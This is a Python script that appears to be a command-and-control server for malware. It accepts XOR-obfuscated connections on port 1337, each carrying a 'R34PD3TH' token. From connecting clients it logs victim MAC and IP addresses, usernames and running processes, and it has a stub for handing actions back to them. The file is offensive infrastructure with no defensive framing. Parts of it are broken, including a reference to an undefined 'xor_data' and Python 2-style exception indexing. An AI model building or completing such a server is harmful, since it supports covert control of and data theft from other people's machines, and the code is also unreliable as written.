#!/usr/bin/env python3
# -*- coding: utf-8 -*-`

import socket
import sys
from _thread import *

def xor_crypto(data):
    key = b'i' * len(data)
    int_data = int.from_bytes(data, sys.byteorder)
    int_key = int.from_bytes(key, sys.byteorder)
    int_enc = int_data ^ int_key
    return int_enc.to_bytes(len(data), sys.byteorder)

#print(xor_crypto(b'dad'))
#print(xor_crypto(b'\r\x08\r'))

HOST = ''
PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print('[-] Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
    sys.exit()
s.listen(10)
print('[+] Socket now listening')

#Function for handling connections. This will be used to create threads
def clientthread(conn):
    while True:
        data = xor_crypto(conn.recv(4096))

        print("DEBUG\n" + str(data) + "\nDEBUG\n")
        print("DEBUG XOR\n" + str(xor_data) + "\nDEBUG_XOR\n")

        data_len = len(data)
        print("[+] Recieved " + str(data_len) + " bytes of data")

        if data_len < 16:
            print("[-] Discarded Invalid Block - Reason: too small")
            break


        token = data[0:8]
        conn_type = data[8:16]
        client_data = data[16:data_len]

        if not data:
            break

        #Make sure the block is starting with the correct bytes
        if token != b'R34PD3TH':
            print("[-] Discarded Invalid Block - Reason: invalid token")
            break

        #Handle the data
        if conn_type == b'12345678':
            #Connection type used for testing
            print("[D] Connection Type: TEST (12345678)")
        elif conn_type == b'MACCADDR':
            #Mac address incoming
            print("[D] MAC Address: " + str(client_data[:17]) + '\n')
        elif conn_type == b'IPIPADDR':
            print("[D] IP Address: " + str(client_data[:15]) + '\n')
        elif conn_type == b'USERNAME':
            print("[D] Username: " + str(client_data[:32]) + '\n')
        elif conn_type == b'PROCSPLZ':
            print("[D] Running Processes: " + str(client_data) + '\n')
        elif conn_type == b'STORETXT':
            print("[D] Connection Type: STORE TEXT (STORETXT)")
            #TODO actually store the data
        elif conn_type == b'GIMMEACT':
            #Client is requesting something to do
            print("[D] Connection Type: REQUESTING ACTION (GIMMEACT)")
            #TODO check ./actions/ for action files send them back to the client
            print("[+] Action Requested")
        else:
            print("[?] Unknown connection type: " + conn_type.decode('ascii'))

    conn.close()

#now keep talking with the client
while 1:
    #wait to accept a connection - blocking call
    conn, addr = s.accept()
    print('\n[=+= Connection from ' + addr[0] + ':' + str(addr[1]) + " =+=]")

    #start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
    start_new_thread(clientthread ,(conn,))

s.close()
